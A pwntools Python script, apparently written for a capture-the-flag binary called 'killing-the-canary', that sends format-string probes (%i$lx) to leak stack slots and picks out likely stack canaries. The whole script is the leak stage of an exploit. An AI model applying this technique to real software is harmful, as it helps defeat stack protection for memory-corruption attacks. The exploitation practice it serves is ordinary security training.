#!/usr/bin/env python3
import re
from pwn import *

context.log_level = "info"
exe = context.binary = ELF("./killing-the-canary")

candidates = []

for i in range(1, 32):
    r = process([exe.path])

    # 1) Send the probe for slot i
    r.sendlineafter(b"What's your name? ", f"%{i}$lx".encode())

    # 2) Read the line that contains the echo/leak
    leak = r.recvline()  # e.g., b"Hello, 7fff2db63b40!\n"
    # Optionally drain any banner:
    # r.recvuntil(b"What's your message? ")

    # 3) Extract the last hex-looking token
    toks = re.findall(rb'(?:0x)?[0-9a-fA-F]{8,}', leak)
    if toks:
        val = toks[-1].lower().lstrip(b"0x")

        # Heuristic: canary ends with 00 (LSB is NUL) and usually doesn't look like a pointer
        if val.endswith(b"00") and not val.startswith((b"7f", b"55", b"40")):
            candidates.append((i, val))
            log.info(f"possible canary @ %{i}$lx = {val.decode()}")

    # 4) Finish the run (the program expects a message then exits)
    r.sendlineafter(b"What's your message? ", b"a")
    # Read the program’s final output so the process exits cleanly
    r.recvuntil(b"Your message is ")
    r.recvline()  # consume "a\n"
    r.close()

print("Possible canaries:", candidates)
